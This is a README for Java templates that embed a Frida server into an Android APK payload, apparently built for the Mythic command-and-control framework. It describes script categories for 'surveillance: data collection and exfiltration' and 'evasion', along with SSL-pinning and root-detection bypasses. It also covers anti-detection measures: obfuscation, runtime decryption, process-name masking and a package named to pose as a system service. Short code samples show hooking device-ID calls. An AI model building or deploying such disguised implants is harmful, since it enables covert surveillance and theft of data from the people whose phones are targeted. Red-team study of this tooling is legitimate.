# Frida Integration Java Templates

This directory contains Java templates for integrating Frida functionality into the Android APK payload.

## Files Overview

### Core Integration Classes

#### `FridaIntegrationService.java`
- Main service that manages the embedded Frida server
- Handles architecture-specific binary extraction and deployment
- Provides service binding interface for other components
- Features:
  - Automatic architecture detection (ARM64, ARM32, x86_64, x86)
  - Base64 encoded binary extraction from assets
  - Frida server process management
  - Multi-threaded operation with ExecutorService
  - Service lifecycle management

#### `FridaMultiHandler.java`
- Multi-session Frida script management
- Thread-safe operations for concurrent Frida sessions
- Features:
  - Session isolation and management
  - Asynchronous script execution
  - Process hooking and spawning capabilities
  - Session status monitoring
  - Automatic cleanup and resource management

#### `FridaScriptManager.java`
- Centralized script loading and management
- Built-in script library with common hooks
- Features:
  - Asset-based script loading
  - Built-in script collection (SSL bypass, root bypass, etc.)
  - Custom hook generation
  - Script combination capabilities
  - Runtime script management

## Integration with Build System

### APK Integration Process

1. **Asset Embedding**: The `enhanced_build.py` script embeds Frida assets into the APK
2. **Service Registration**: Services are registered in the Android manifest
3. **Runtime Initialization**: Services start automatically or on-demand
4. **Script Execution**: Scripts are loaded and executed based on operational requirements

### Architecture Support

The integration supports multiple Android architectures:
- **ARM64-v8a**: Modern 64-bit ARM devices (most current Android devices)
- **ARMeabi-v7a**: Legacy 32-bit ARM devices
- **x86_64**: Intel/AMD 64-bit processors (some tablets, emulators)
- **x86**: Intel/AMD 32-bit processors (older devices, emulators)

## Usage in APK

### Service Binding Example
```java
// Bind to Frida Integration Service
Intent serviceIntent = new Intent(this, FridaIntegrationService.class);
bindService(serviceIntent, new ServiceConnection() {
    @Override
    public void onServiceConnected(ComponentName name, IBinder service) {
        FridaMultiHandler.FridaMultiHandlerBinder binder = 
            (FridaMultiHandler.FridaMultiHandlerBinder) service;
        FridaMultiHandler multiHandler = binder.getService();
        
        // Execute script
        String sessionId = multiHandler.executePredefinedScript("ssl_bypass", "com.example.app");
    }
    
    @Override
    public void onServiceDisconnected(ComponentName name) {}
}, Context.BIND_AUTO_CREATE);
```

### Direct Script Execution
```java
// Get script manager
FridaScriptManager scriptManager = new FridaScriptManager(context);
scriptManager.loadDefaultScripts();

// Execute custom hook
String hookScript = scriptManager.createHookScript(
    "android.telephony.TelephonyManager", 
    "getDeviceId", 
    "log"
);

// Execute via multi-handler
multiHandler.executeScript(hookScript, "system_server");
```

## Built-in Scripts

### Available Scripts
- **system_info**: Device information gathering
- **activity_monitor**: Activity lifecycle monitoring  
- **network_monitor**: Network connection monitoring
- **file_monitor**: File system operation monitoring
- **ssl_bypass**: SSL/TLS certificate pinning bypass
- **root_bypass**: Root detection evasion

### Script Categories
- **Monitoring**: System and application behavior tracking
- **Bypass**: Security mechanism evasion
- **Surveillance**: Data collection and exfiltration
- **Evasion**: Anti-analysis and stealth operations

## Security Features

### Anti-Detection
- Binary obfuscation with ProGuard
- Runtime decryption of Frida binaries
- Process name masking
- Hook detection evasion

### Stealth Operation
- Service operates in background without UI
- Minimal resource footprint
- Integrated with system service naming
- Error handling prevents crashes

## Build Integration

### Makefile Targets
```bash
# Install Frida and dependencies
make install-frida

# Create Frida assets
make create-frida-agent-assets

# Build APK with embedded Frida
make build
```

### Enhanced Build Script
The `enhanced_build.py` script automatically:
1. Detects available Frida binaries
2. Embeds architecture-specific servers
3. Includes Java integration classes
4. Applies ProGuard obfuscation
5. Signs and packages the APK

## Testing

### Verification Commands
```bash
# Check Frida server extraction
adb shell "ls -la /data/data/com.android.systemservice/files/frida/"

# Monitor Frida server process
adb shell "ps | grep frida-server"

# Check service status
adb shell "dumpsys activity services | grep FridaIntegration"
```

### Debug Output
The integration provides extensive logging:
- Service lifecycle events
- Binary extraction status  
- Script execution results
- Session management activities
- Error conditions and recovery

## Compatibility

### Android Versions
- Android 12+ (API 31+) - Full feature support
- Android 10-11 (API 29-30) - Core functionality
- Android 8-9 (API 26-28) - Limited features

### Device Support
- Rooted devices: Full functionality
- Non-rooted devices: Limited to app-level hooks
- Emulators: Full support for testing

## Troubleshooting

### Common Issues
1. **Binary Extraction Failure**: Check asset paths and permissions
2. **Service Binding Issues**: Verify manifest registration
3. **Script Execution Errors**: Check target process and permissions
4. **Architecture Mismatch**: Ensure correct binary for device architecture

### Debug Mode
Enable debug logging by setting log level:
```java
Log.setLoggable("FridaService", Log.DEBUG);
Log.setLoggable("FridaMultiHandler", Log.DEBUG);
Log.setLoggable("FridaScriptManager", Log.DEBUG);
```

## Notes

- These templates are designed for the Mythic framework integration
- All operations are performed asynchronously to prevent ANR issues
- Resource cleanup is handled automatically on service destruction
- Scripts are cached in memory for performance optimization
